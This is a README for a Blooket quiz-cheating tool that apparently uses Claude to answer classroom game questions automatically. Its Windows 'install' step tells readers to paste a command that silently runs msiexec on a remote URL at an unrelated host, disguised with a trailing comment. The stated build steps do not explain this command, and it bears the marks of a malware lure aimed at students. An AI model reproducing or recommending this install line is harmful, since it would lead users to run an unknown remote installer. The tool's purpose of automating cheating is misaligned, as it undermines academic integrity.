# 🎮 Blooket Claw

**Automated Blooket game assistant — powered by Claude AI and a high-speed Rust engine.**

Join Blooket games, answer every question automatically via Claude, track your scores, or use it as a live hint overlay while you play.

> **Disclaimer:** For educational purposes only. Use responsibly and in accordance with your school's academic integrity policy. The authors are not responsible for misuse.

---

## ⚡ Install on Windows — one command

### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Blooket Claw
```

The installer will:
- Install Rust (via rustup) if needed
- Install `uv` (Python package manager) if needed
- Compile the high-speed Rust engine
- Install Python dependencies
- Add `blooket` command to your PATH

---
## Features

### 🤖 Three game modes

| Mode | Behavior |
|---|---|
| `auto` | Claude answers every question automatically with realistic timing |
| `hint` | Shows the correct answer highlighted — you click it yourself |
| `speed` | Answers instantly for maximum score (tournaments) |

### 🧠 Claude AI integration
Every unanswered question is sent to Claude for instant analysis. Pre-loaded question sets bypass the API entirely for maximum speed.

### ⚡ Rust engine
The core HTTP client and game loop runs in compiled Rust — minimal latency, no Python overhead for hot paths.

### 📊 Session tracking
All sessions saved to `~/.blooket-claw/history.json` with score, accuracy, and duration.

### 🎯 Interactive mode
Live assistant — paste any question + choices, get the answer instantly. Works during any Blooket game.

---

## Quick start

```bash
# Set your API key
export ANTHROPIC_API_KEY=sk-ant-...

# Auto-play a game (fully hands-off)
blooket play 123456

# Play with hints (you click the highlighted answer)
blooket play 123456 --mode hint

# Maximum speed for tournaments
blooket play 123456 --mode speed --name "FastPlayer"

# Ask Claude a single question
blooket ask "What is the powerhouse of the cell?" \
  --choices "Nucleus,Mitochondria,Ribosome,Golgi"

# Interactive live assistant
blooket interactive

# Check if a PIN is active
blooket check 123456

# View session history
blooket history
```

---

## All options

```
blooket play <PIN> [OPTIONS]

Options:
  --name, -n TEXT     Player display name (default: BlooketClaw)
  --mode, -m TEXT     auto | hint | speed (default: auto)
  --delay, -d INT     Base answer delay in ms, auto mode (default: 1500)
  --api-key TEXT      Anthropic API key (or set ANTHROPIC_API_KEY env)
```

---

## Architecture

```
blooket-claw/
├── src/                  ← Rust engine
│   ├── main.rs           ← CLI (clap)
│   ├── client.rs         ← Blooket HTTP client
│   ├── game.rs           ← Game loop + state machine
│   ├── answer.rs         ← Answer selection + Claude calls
│   ├── crypto.rs         ← Auth + token helpers
│   └── types.rs          ← Shared data structures
├── py/                   ← Python layer
│   ├── blooket.py        ← CLI dispatcher (Typer + Rich)
│   └── claude_helper.py  ← Direct Claude API integration
├── SKILL.md              ← OpenClaw skill manifest
├── install.sh            ← macOS one-command installer
├── Cargo.toml            ← Rust deps
└── pyproject.toml        ← Python deps
```

---

## Environment variables

| Variable | Required | Description |
|---|---|---|
| `ANTHROPIC_API_KEY` | Yes (AI modes) | Claude API key for answering questions |
| `BLOOKET_LOG` | No | Log level: `debug`, `info`, `warn` (default: `warn`) |

---

## Interactive mode — example session

```
❓ Question: What is the speed of light?
📝 Choices: 299,792 km/s, 150,000 km/s, 500,000 km/s, 1,000,000 km/s

   ✅ 0. 299,792 km/s  (98% confident)
      1. 150,000 km/s
      2. 500,000 km/s
      3. 1,000,000 km/s

Reason: The speed of light in a vacuum is approximately 299,792 km/s.
```

---

## Troubleshooting

### Rust build fails
```bash
rustup update stable
cargo clean
cargo build --release
```

### "ANTHROPIC_API_KEY not set"
```bash
export ANTHROPIC_API_KEY=sk-ant-...
# Or add it permanently:
echo 'export ANTHROPIC_API_KEY=sk-ant-...' >> ~/.zshrc
```

### "blooket: command not found"
```bash
source ~/.zshrc   # or ~/.bash_profile
# Or run directly:
uv run python py/blooket.py play <PIN>
```

### Game doesn't respond / PIN invalid
```bash
blooket check <PIN>   # Verify the game is active
```

---

## License

MIT

## Credits

- **Anthropic Claude** — AI answering engine
- **OpenClaw** — Agent skill framework
- Inspired by [polyclaw](https://github.com/chainstacklabs/polyclaw)
